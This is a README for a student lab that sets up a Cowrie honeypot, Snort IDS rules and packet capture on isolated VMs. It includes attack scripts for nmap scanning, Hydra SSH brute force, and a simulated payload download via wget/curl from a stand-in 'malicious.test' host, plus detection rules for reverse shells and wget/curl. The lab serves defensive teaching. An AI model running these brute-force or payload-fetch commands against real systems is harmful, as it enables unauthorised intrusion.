# 🛡️ Cyber Security Mini Project

## **Comparative Security Analysis Using Cowrie Honeypot, Snort IDS & Packet Capture**

This repository contains everything you need to reproduce the lab from the mini-project: a Cowrie honeypot (Docker), Snort IDS configuration and rules, packet-capture commands, and attack automation scripts used during testing.

> ⚠️ **Important (Safety & Legal):** Only run this lab in isolated, private networks (VirtualBox host-only/Internal network). Do **not** deploy honeypots or run offensive tools on public/production networks without explicit authorization.

---

## 📁 Repository layout

```
CyberSecurity-Mini-Project/
│
├── README.md                 <- this file (how to run)
├── architecture/
│   └── project-architecture.png
│
├── cowrie-honeypot/
│   ├── docker-compose.yml
│   ├── cowrie.cfg            <- minimal example config
│   └── README-cowrie.md
│
├── snort-ids/
│   ├── local.rules
│   ├── snort.lua             <- minimal snippet to include local.rules
│   └── README-snort.md
│
├── attack-scripts/
│   ├── nmap-scan.sh
│   ├── hydra-bruteforce.sh
│   └── wget-malware-test.sh
│
├── packet-capture/
│   └── capture-instructions.md
│
└── report/
    └── Mini-Project-Report.pdf   (optional)
```

---

## Getting started (high-level)

1. Create two VMs in VirtualBox on a Host-Only / Internal network (no internet):

   * **Ubuntu VM** (honeypot) — static IP `192.168.56.102`
   * **Kali VM** (attacker + Snort) — static IP `192.168.56.101`

2. On the **Ubuntu VM**, install Docker and start Cowrie using the `cowrie-honeypot/docker-compose.yml` file.

3. On the **Kali VM**, install and configure Snort, put `snort-ids/local.rules` into your rules folder and point Snort configuration to include it.

4. Use `attack-scripts/` from Kali to run attacks. Capture traffic with `tcpdump` and correlate logs using timestamps.

---

## Files (contents below)

I have included the full contents for these key files. Copy them into the repository on your VMs.

---

### 1) `cowrie-honeypot/docker-compose.yml`

```yaml
version: '3.3'
services:
  cowrie:
    image: cowrie/cowrie:latest
    container_name: cowrie
    restart: unless-stopped
    ports:
      - "2222:2222"   # SSH honeypot (Cowrie)
      - "2223:2223"   # Telnet (if enabled in Cowrie image)
    volumes:
      - ./cowrie-data/log:/cowrie/log
      - ./cowrie-data/etc:/cowrie/etc
    environment:
      - TZ=UTC
```

**Notes:**

* This is a minimal compose file using the official image. For lab use, create `cowrie-data/etc/cowrie.cfg` or mount a prepared config. Cowrie will write logs to `/cowrie/log` which we mapped to `./cowrie-data/log`.

---

### 2) `cowrie-honeypot/cowrie.cfg` (minimal example — put under `cowrie-data/etc/cowrie.cfg`)

```ini
[ssh]
enable = true
listen_port = 2222
listen_addr = 0.0.0.0

[output_json]
enabled = true

[honeypot]
# Choose a simple filesystem template shipped with the image or customize
filesystem = fs.pickle

[database_mysql]
enabled = false
```

**Notes:**

* For a full production-like config, use Cowrie's default config as a template. For this lab the minimal config and default filesystem are enough.

---

### 3) `snort-ids/local.rules` (drop into `/etc/snort/rules/local.rules` on Kali)

```text
# Local Snort rules used by the mini-project
alert tcp any any -> 192.168.56.102 2222 (msg:"SSH attempt to Cowrie honeypot"; sid:1000001; rev:1;)
alert tcp any any -> 192.168.56.102 22 (msg:"SSH attempt to port 22"; sid:1000002; rev:1;)
alert tcp any any -> 192.168.56.102 any (flags:S; msg:"General SYN packet to honeypot"; sid:1000003; rev:1;)
alert http any any -> any any (msg:"HTTP payload indicator wget"; content:"wget"; http_uri; sid:1000004; rev:1;)
alert http any any -> any any (msg:"HTTP payload indicator curl"; content:"curl"; http_uri; sid:1000005; rev:1;)

# Additional rules (useful in lab)
alert tcp any any -> 192.168.56.102 2222 (msg:"Possible SSH brute force"; flags:S; threshold:type both, track by_src, count 10, seconds 10; sid:1000006; rev:1;)
alert tcp any any -> 192.168.56.102 any (flags:0; msg:"Nmap NULL Scan Detected"; sid:1000007; rev:1;)
alert tcp any any -> 192.168.56.102 any (flags:FPU; msg:"Nmap XMAS Scan Detected"; sid:1000008; rev:1;)
alert tcp any any -> 192.168.56.102 any (flags:F; msg:"Nmap FIN Scan Detected"; sid:1000009; rev:1;)
alert tcp any any -> any 80 (msg:"Possible Directory Traversal"; content:"../"; sid:1000010; rev:1;)
alert http any any -> any any (msg:"Suspicious User-Agent (curl/wget)"; content:"User-Agent"; http_header; nocase; sid:1000011; rev:1;)
alert tcp any any -> any 4444 (msg:"Reverse Shell Attempt on port 4444"; sid:1000018; rev:1;)
```

**Notes:**

* `sid` values must be unique per rule. Keep these local SIDs in the range you choose for lab rules.
* Test the rules in IDS/test mode before enabling inline blocking.

---

### 4) `snort-ids/snort.lua` (snippet to include local.rules)

```lua
ips =
{
    enable_builtin_rules = true,
    rules = [[
        include /etc/snort/rules/local.rules
    ]],
}
```

**Usage:** Place this snippet (or edit the existing snort.lua) so the `ips.rules` or `ips.rules` equivalent loads your `local.rules` file. Validate with `sudo snort -c /etc/snort/snort.lua -T`.

---

### 5) `attack-scripts/nmap-scan.sh`

```bash
#!/bin/bash
# nmap-scan.sh - perform typical reconnaissance scans against the honeypot
TARGET=192.168.56.102

# SYN scan top ports
sudo nmap -sS -p- -T4 $TARGET -oN nmap_full_syn.txt

# Version detection on cowrie port 2222
sudo nmap -sV -p 2222 $TARGET -oN nmap_2222_sV.txt

# Quick ping sweep (local)
sudo nmap -sn 192.168.56.0/24 -oN nmap_ping_sweep.txt

echo "Nmap scans done. Results: nmap_full_syn.txt, nmap_2222_sV.txt, nmap_ping_sweep.txt"
```

Make executable: `chmod +x nmap-scan.sh`.

---

### 6) `attack-scripts/hydra-bruteforce.sh`

```bash
#!/bin/bash
# hydra-bruteforce.sh - run a simple hydra SSH brute-force against Cowrie
TARGET=192.168.56.102
PORT=2222
USER=root
PASSLIST=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-20.txt

if [ ! -f "$PASSLIST" ]; then
  echo "Password list not found: $PASSLIST"
  exit 1
fi

hydra -l $USER -P $PASSLIST ssh://$TARGET:$PORT -t 4 -f -V | tee hydra_results.txt

echo "Hydra finished. See hydra_results.txt for output."
```

**Notes:**

* Hydra is noisy. Use small lists in the lab and be careful with system resources.

---

### 7) `attack-scripts/wget-malware-test.sh`

```bash
#!/bin/bash
# wget-malware-test.sh - attempts to download files via wget/curl inside an interactive session
# This script simulates attacker action by requesting a URL from the target (run from Kali targeting Cowrie via SSH)
TARGET=192.168.56.102
PORT=2222
USER=root

# Example: run an interactive (non-destructive) command via ssh to the honeypot
ssh -o StrictHostKeyChecking=no -p $PORT $USER@$TARGET <<'EOF'
# These commands are simulated inside Cowrie (which will log them but not execute real downloads)
wget http://malicious.test/payload.sh
curl http://malicious.test/bad.exe
EOF

echo "wget/curl simulation sent to Cowrie. Check Cowrie logs."
```

---

### 8) `packet-capture/capture-instructions.md`

```
# Packet capture instructions (tcpdump)

# On Kali (monitor the interface used by VirtualBox host-only):
sudo tcpdump -i eth0 -w /tmp/honeypot_traffic.pcap
# Run attacks while tcpdump is running. Stop with Ctrl+C.

# Inspect the pcap:
wireshark /tmp/honeypot_traffic.pcap

# Useful tcpdump filters to reduce file size:
# Capture only TCP to/from honeypot
sudo tcpdump -i eth0 host 192.168.56.102 and tcp -w /tmp/honeypot_tcp.pcap
```

---

## How to run the lab (step-by-step)

1. **Ubuntu honeypot VM**

   * Install Docker: `sudo apt update && sudo apt install -y docker.io docker-compose`
   * Copy `cowrie-honeypot/docker-compose.yml` and create `cowrie-data` directory with `etc` and `log` subfolders.
   * Place `cowrie.cfg` in `cowrie-data/etc/` if customizing.
   * Start: `docker-compose up -d`
   * Check logs: `docker logs -f cowrie`

2. **Kali VM (Snort + attack tools)**

   * Install Snort 3 (package or build): `sudo apt update && sudo apt install snort`
   * Place `snort-ids/local.rules` into `/etc/snort/rules/`.
   * Edit `/etc/snort/snort.lua` to include the rules (see snippet above).
   * Validate config: `sudo snort -c /etc/snort/snort.lua -T`
   * Run Snort: `sudo snort -c /etc/snort/snort.lua -i eth0 -A alert_fast`

3. **Capture & Attack**

   * On Kali, start `sudo tcpdump -i eth0 -w /tmp/honeypot_traffic.pcap`.
   * Run `attack-scripts/nmap-scan.sh` and `attack-scripts/hydra-bruteforce.sh`.
   * Run wget simulate script to send `wget`/`curl` commands via SSH.

4. **Correlation**

   * Match timestamps in:

     * Cowrie JSON logs (`cowrie-data/log/cowrie.json` or similar)
     * Snort alerts (`/var/log/snort/alert` or configured alert output)
     * tcpdump pcap timestamps

---

## Extra: Tips for Viva & Report

* Always mention isolation and legal constraints.
* Explain why Snort is on the attacker VM (lab sensor) and how the real-world mapping uses SPAN/taps.
* Show sample Cowrie JSON excerpts and the exact custom Snort rule you wrote from those logs.
* Include a short table mapping an attack event to Cowrie log entry, Snort alert, and pcap evidence.

---
